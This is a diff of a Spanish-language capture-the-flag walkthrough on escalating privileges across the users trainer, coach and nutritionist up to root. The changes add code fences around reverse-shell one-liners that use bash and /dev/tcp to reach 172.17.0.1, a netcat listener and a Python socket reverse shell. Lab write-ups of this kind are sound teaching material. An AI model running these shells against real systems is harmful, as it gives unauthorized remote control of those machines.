@@ -92,26 +92,34 @@ sudo -u trainer /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/442 0>1'
 Miramos en nuestra terminal si nos ha llegado y ha funcionado perfectamente. Ahora somos el usuario trainer pero debemos continuar buscando la forma de llegar a ser root.
 
 <img width="996" height="293" alt="10esperarRevel" src="https://github.com/user-attachments/assets/f2c31646-9116-428b-920b-87e72dc132db" />
-
+<br><br>
 
 Ahora tenemos que seguir buscando como escalar privilegios, comenzamos probando de nuevo sudo -l y vemos que también podemos ejecutar como el usuario coach sin usar contraseña /bin/bash.
 
 <img width="998" height="313" alt="11coachahora" src="https://github.com/user-attachments/assets/f4236703-7eea-46b8-9fc8-03bb04a36b2f" />
+<br><br>
 
 Ahora nos ponemos a la escucha por el puerto 443 y volvemos a lanzar la reverse shell pero esta vez como el usuario coach.
+```bash
+sudo -u coach /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
+```
 
 <img width="1244" height="464" alt="12nosfuimos" src="https://github.com/user-attachments/assets/2baad9fd-b0f9-4464-823d-c64326984a51" />
+<br><br>
 
 <img width="843" height="199" alt="13sanitizamostty" src="https://github.com/user-attachments/assets/d4d9a740-0d21-47e2-b7f0-905c25441795" />
+<br><br>
 
 <img width="1236" height="249" alt="14otromas" src="https://github.com/user-attachments/assets/2fe2bdf3-762b-4c80-af10-2eafbed4b129" />
+<br><br>
 
 <img width="1232" height="223" alt="14venga" src="https://github.com/user-attachments/assets/0e484871-9d9a-47f9-9e6c-290247c81815" />
-sudo -u trainer /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/442 0>&1'
 
-sudo -u coach /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 
+
+```bash
 sudo -u nutritionist /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/444 0>&1'
+```
 
 <img width="1005" height="205" alt="15aleluya" src="https://github.com/user-attachments/assets/e03b9474-6b5f-4995-9562-5fbcf1f8b82a" />
 
@@ -120,9 +128,11 @@ sudo -u nutritionist /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/444 0>&1'
 
 <img width="891" height="248" alt="16podriayes" src="https://github.com/user-attachments/assets/98dfcaac-dfa0-41b1-a178-2994c29df908" />
 
-
+```bash
 sudo nc -lvnp 440
+```
 
+```bash
 import socket
 import subprocess
 import os
@@ -135,11 +145,11 @@ os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 
 p = subprocess.call(["/bin/sh", "-i"])
-
+```
 
 
 <img width="914" height="307" alt="18flag" src="https://github.com/user-attachments/assets/17c9a34e-01c7-4230-938f-cbfe57276251" />
-
+<br><br>
 <img width="1035" height="650" alt="porsi" src="https://github.com/user-attachments/assets/6a8eae5f-8615-40eb-b563-8074667172df" />
 
 
